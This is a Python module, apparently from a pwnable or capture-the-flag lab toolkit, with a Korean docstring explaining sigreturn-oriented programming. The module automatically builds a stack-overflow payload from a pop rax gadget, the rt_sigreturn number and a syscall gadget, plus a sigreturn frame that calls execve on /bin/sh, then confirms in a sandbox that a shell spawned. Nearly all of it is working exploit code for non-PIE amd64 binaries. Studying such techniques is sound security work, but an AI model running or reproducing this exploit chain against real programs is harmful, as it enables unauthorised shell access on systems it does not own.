"""완전 자동 SROP(Sigreturn-Oriented Programming) — 셸 획득까지 증명.

``pop rdi/rsi/rdx`` 같은 인자 가젯이 부족해도, ``syscall`` 가젯 + rax 를 15 로 만드는
``pop rax`` 가젯 + ``/bin/sh`` 문자열만 있으면 SROP 로 임의 레지스터를 세팅해
``execve("/bin/sh", 0, 0)`` 를 부를 수 있다. 이 모듈은 그 체인을 자동 구성해 PTY 로
셸 획득을 증명한다(ret2system/execve 코어와 동일 구조).

체인: ``[pad][pop rax][15][syscall]`` 로 ``rt_sigreturn`` 을 부르면, 스택에 이어 붙인
sigreturn 프레임이 ``rip=syscall, rax=59(execve), rdi=&"/bin/sh", rsi=rdx=0`` 을 복원해
다시 ``syscall`` → ``execve`` 로 셸이 뜬다. non-PIE amd64.
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import is_pie, srop_plan
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import p64
from pwnable_lab.payload.srop import build_sigreturn_frame
from pwnable_lab.sandbox.runner import SandboxLimits, verify_shell

_SYS_EXECVE = 59


def auto_srop(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """단일 바이너리에 대해 SROP 를 자동 구성·검증한다(셸 획득까지 증명, non-PIE amd64)."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        return {"attempted": False, "reason": "pie-needs-base-leak"}

    plan = srop_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-srop-plan"}

    limits = limits or SandboxLimits()
    pop_rax, syscall, binsh = plan["pop_rax"], plan["syscall"], plan["binsh"]

    # sigreturn 프레임: execve("/bin/sh", 0, 0). rsp 는 유효 매핑(binsh)로 둔다.
    frame = build_sigreturn_frame(
        rip=syscall, rax=_SYS_EXECVE, rdi=binsh, rsi=0, rdx=0, rsp=binsh
    )
    # pop rax; 15(rt_sigreturn); syscall → 프레임 복원 → execve.
    payload = b"A" * offset + p64(pop_rax) + p64(15) + p64(syscall) + frame

    marker = "PWNPILOT_" + secrets.token_hex(4)
    proof = verify_shell(binary_path, payload, marker=marker, limits=limits)
    return _report(plan, proof.shell_spawned, proof.as_dict())


def _report(plan: dict, succeeded: bool, shell_proof: dict) -> dict:
    return {
        "attempted": True,
        "technique": "srop",
        "pop_rax_hex": f"0x{plan['pop_rax']:x}",
        "syscall_hex": f"0x{plan['syscall']:x}",
        "binsh_hex": f"0x{plan['binsh']:x}",
        "shell_proven": succeeded,
        "succeeded": succeeded,
        "reason": "shell-proven" if succeeded else "did-not-spawn-shell",
        "shell_proof": shell_proof,
    }


__all__ = ["auto_srop"]
